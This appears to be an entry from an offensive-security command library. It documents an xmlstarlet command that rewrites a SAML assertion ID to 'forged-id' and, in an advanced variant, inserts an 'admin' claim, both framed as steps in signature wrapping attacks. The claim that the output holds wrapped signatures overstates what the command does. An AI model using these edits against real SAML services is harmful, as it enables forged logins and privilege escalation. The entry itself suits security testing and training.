---
data: xmlstarlet ed -u '//Assertion/ID' -v 'forged-id' metadata.xml > forged.xml
tags:
  - xml
  - forgery
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: d1efeaaf-7e93-4e08-ba6d-3c2c1038971f
created_at: '2025-12-13T09:01:26.744Z'
updated_at: '2025-12-13T09:01:26.744Z'
verified: false
validated: true
submitted: true
---
# Modify XML Signature

## Command

```bash
xmlstarlet ed -u '//Assertion/ID' -v 'forged-id' metadata.xml > forged.xml
```

## Description

This command edits XML files to modify elements for signature wrapping attacks in SAML responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ed` | Edit mode | Yes |
| `-u '//Assertion/ID'` | XPath to update | Yes |
| `-v 'forged-id'` | New value | Yes |
| `metadata.xml` | Input file | Yes |
| `> forged.xml` | Output redirection | Yes |

## Examples

### Basic Usage

```bash
xmlstarlet ed -u '//Assertion/ID' -v 'forged-id' metadata.xml > forged.xml
```

### Advanced Usage

```bash
xmlstarlet ed -u '//Assertion/ID' -v 'forged-id' -i '//Assertion' -t elem -n 'Claim' -v 'admin' metadata.xml > forged.xml
```

## Expected Output

A modified forged.xml file with wrapped signature elements.

## Related
- [[procedures/Craft-Forged-SAML-Response]]
- [[commands/fetch-saml-metadata]]
